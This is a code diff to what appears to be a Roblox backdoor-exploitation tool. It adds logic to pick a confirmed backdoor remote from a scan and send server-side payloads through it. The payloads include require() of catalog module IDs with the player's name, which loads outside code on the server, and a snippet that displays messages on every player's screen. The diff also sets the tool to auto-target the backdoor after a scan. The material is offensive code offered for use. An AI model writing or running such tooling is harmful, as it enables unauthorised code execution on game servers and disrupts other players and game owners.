@@ -829,6 +829,35 @@ local function applyWorkingShape(shape, code)
 	return code
 end
 
+-- pick the strongest confirmed remote from the last scan (verified first)
+local function bestConfirmedRemote()
+	local fallback, fallbackShape
+	for _, m in ipairs(State.results) do
+		if m.hits > 0 then
+			if m.verified then
+				return m.remote, m.workingShape
+			end
+			if not fallback then
+				fallback = m.remote
+				fallbackShape = m.workingShape
+			end
+		end
+	end
+	return fallback, fallbackShape
+end
+
+-- server-side snippet that writes the message on every player's screen
+-- (Hint, with Message as fallback) and cleans itself up afterwards
+local function screenHintPayload(msg)
+	local esc = msg:gsub("\\", "\\\\"):gsub('"', '\\"'):gsub("[\r\n]", " ")
+	return 'task.spawn(function() local done=false pcall(function() local h=Instance.new("Hint") h.Text="'
+		.. esc
+		.. '" h.Parent=workspace done=true task.wait(10) h:Destroy() end)'
+		.. ' if not done then pcall(function() local m=Instance.new("Message") m.Text="'
+		.. esc
+		.. '" m.Parent=workspace task.wait(10) m:Destroy() end) end end)'
+end
+
 -- score structural signals beyond the name: parent location, sibling names, argument hints
 local STRUCT_BONUS = {
 	ReplicatedStorage = 1,
@@ -1274,7 +1303,7 @@ local function renderRequires()
 			Size = UDim2.new(1, -196, 0, 13),
 			Position = UDim2.new(0, 8, 0, 20),
 			BackgroundTransparency = 1,
-			Text = "used " .. rq.count .. "x in game scripts · runs client-side or via remote",
+							Text = "used " .. rq.count .. "x in game scripts · runs via confirmed remote (server)",
 			TextColor3 = THEME.dim,
 			TextSize = 9,
 			Font = Enum.Font.Code,
@@ -1300,7 +1329,7 @@ local function renderRequires()
 			Size = UDim2.new(0, 54, 0, 24),
 			Position = UDim2.new(1, -122, 0.5, -12),
 			BackgroundColor3 = THEME.good,
-			Text = "LOCAL",
+			Text = "RUN",
 			TextColor3 = Color3.fromRGB(8, 14, 10),
 			TextSize = 9,
 			Font = Enum.Font.GothamBold,
@@ -1332,13 +1361,29 @@ local function renderRequires()
 		end)
 		bindClick(locB, function()
 			task.spawn(function()
-				outputLine("> running require(" .. rq.id .. ") locally...")
+				local code = ('require(%s)("%s")'):format(rq.id, PlayerName)
+				-- require() of a catalog module only works on the server, so a
+				-- confirmed remote is preferred; client-side is the last resort
+				local ref = bestConfirmedRemote()
+				if ref then
+					outputLine("> require(" .. rq.id .. ") via confirmed remote " .. ref.Name .. "...")
+					local ok, res = sendPayload(ref, code)
+					if ok then
+						outputLine("[ok] sent -> " .. ref.Name .. (res ~= nil and (" · returned: " .. tostring(res)) or ""))
+						log("GOOD", "require(" .. rq.id .. ") sent via " .. ref.Name)
+					else
+						outputLine("[x] send failed: " .. tostring(res))
+						log("BAD", "require(" .. rq.id .. ") send failed: " .. tostring(res))
+					end
+					return
+				end
+				outputLine("> no confirmed remote — running require(" .. rq.id .. ") on client...")
 				local f = loadstring or load
 				if not f then
 					outputLine("[x] no loadstring in this executor")
 					return
 				end
-				local fn, err = f(('require(%s)("%s")'):format(rq.id, PlayerName))
+				local fn, err = f(code)
 				if not fn then
 					outputLine("[x] compile: " .. tostring(err))
 					return
@@ -1354,19 +1399,17 @@ local function renderRequires()
 			end)
 		end)
 		bindClick(remB, function()
-			local ref = State.targetRefs[State.targetIndex]
 			local code = ('require(%s)("%s")'):format(rq.id, PlayerName)
 			task.spawn(function()
+				local ref = State.targetRefs[State.targetIndex]
 				if ref == nil then
-					local f = loadstring or load
-					if f then
-						local fn = f(code)
-						if fn then
-							pcall(fn)
-						end
+					ref = bestConfirmedRemote()
+					if ref then
+						outputLine("> target was LOCAL — using confirmed remote " .. ref.Name)
+					else
+						outputLine("[x] no remote target — run a scan or pick a target first")
+						return
 					end
-					outputLine("[i] target was LOCAL — ran locally instead")
-					return
 				end
 				local ok, res = sendPayload(ref, code)
 				outputLine(
@@ -1738,7 +1781,7 @@ local ReqsPage = pages.reqs
 create("TextLabel", {
 	Size = UDim2.new(1, -120, 0, 12),
 	BackgroundTransparency = 1,
-	Text = "require(ID)s used by this game — run locally on client or through a remote.",
+	Text = "require(ID)s used by this game — RUN/REMOTE send them through the confirmed backdoor remote.",
 	TextColor3 = THEME.dim,
 	TextSize = 9,
 	Font = Enum.Font.Gotham,
@@ -2434,6 +2477,15 @@ local function executeCurrent()
 	end)
 	local confirmGuid
 	local ref = State.targetRefs[State.targetIndex]
+	-- require() of a catalog module only works on the server — if the target is
+	-- LOCAL but the scan confirmed a remote, route through it automatically
+	if ref == nil and mode == "REQUIRE" then
+		local best = bestConfirmedRemote()
+		if best then
+			ref = best
+			outputLine("> require runs server-side — routed to confirmed remote " .. ref.Name)
+		end
+	end
 	if ref ~= nil and State.settings.confirmExec then
 		confirmGuid = newGuid()
 		code = code .. "\n" .. markerPayload("JZXE_", confirmGuid)
@@ -2488,56 +2540,26 @@ bindClick(UI.ExecBtn, executeCurrent)
 
 local function hintBroadcast(message)
 	task.spawn(function()
-		local sent = false
-		-- channel 1: modern text chat
-		pcall(function()
-			local tcs = game:GetService("TextChatService")
-			local ch = tcs:FindFirstChild("TextChannels")
-			local general = ch and ch:FindFirstChild("RBXGeneral")
-			if general then
-				general:SendAsync(message)
-				sent = true
+		-- the hint is written on everyone's screen (Hint/Message), never through
+		-- our own chat — it goes through the confirmed backdoor remote
+		local ref, shape = bestConfirmedRemote()
+		if ref then
+			local payload = screenHintPayload(message)
+			local shapes = shape and { applyWorkingShape(shape, payload) } or probeVariants(payload)
+			for _, s in ipairs(shapes) do
+				local ok = sendPayload(ref, s)
+				if ok then
+					log("GOOD", "hint written on all screens via " .. ref.Name)
+					toast("HINT SHOWN", message, THEME.good)
+					return
+				end
+				task.wait()
 			end
-		end)
-		-- channel 2: legacy chat
-		if not sent then
-			pcall(function()
-				local rs = game:GetService("ReplicatedStorage")
-				local ev = rs:FindFirstChild("DefaultChatSystemChatEvents")
-				local say = ev and ev:FindFirstChild("SayMessageRequest")
-				if say then
-					say:FireServer(message, "All")
-					sent = true
-				end
-			end)
-		end
-		-- channel 3: known broadcast remotes games commonly expose
-		if not sent then
-			pcall(function()
-				for _, obj in ipairs(game:GetDescendants()) do
-					if obj:IsA("RemoteEvent") then
-						local n = obj.Name:lower()
-						if
-							n:find("broadcast", 1, true)
-							or n:find("announce", 1, true)
-							or n:find("notifyall", 1, true)
-							or n:find("chatmsg", 1, true)
-						then
-							pcall(obj.FireServer, obj, message)
-							sent = true
-							break
-						end
-					end
-				end
-			end)
-		end
-		if sent then
-			log("GOOD", "hint broadcast to all players")
-			toast("HINT SENT", message, THEME.good)
+			log("WARN", "hint payload rejected by " .. ref.Name .. " — shown locally only")
 		else
-			log("WARN", "no chat channel — hint shown locally only")
-			toast("HINT (local)", message, THEME.warn)
+			log("WARN", "no confirmed remote — hint shown locally only")
 		end
+		toast("HINT (local)", message, THEME.warn)
 	end)
 end
 
@@ -2930,6 +2952,19 @@ local function runScanCore()
 		setStatus(("DONE — %d confirmed backdoor(s)! Open EXEC."):format(#confirmedList))
 		log("GOOD", "scan done: " .. #confirmedList .. " confirmed in " .. string.format("%.1fs", elapsed))
 		History.AttachRequires(reqList)
+		-- jump the EXEC target straight onto the strongest confirmed remote so
+		-- require/lua runs server-side without the user touching anything
+		local best = bestConfirmedRemote()
+		if best then
+			for idx, r in ipairs(State.targetRefs) do
+				if r == best then
+					State.targetIndex = idx
+					updateTargetLabel()
+					outputLine("> target auto-set to confirmed remote " .. best.Name)
+					break
+				end
+			end
+		end
 	else
 		setStatus("Done — no exploitable remotes found. Try HIGH.")
 		log("INFO", "scan done: nothing confirmed (" .. string.format("%.1fs", elapsed) .. ")")
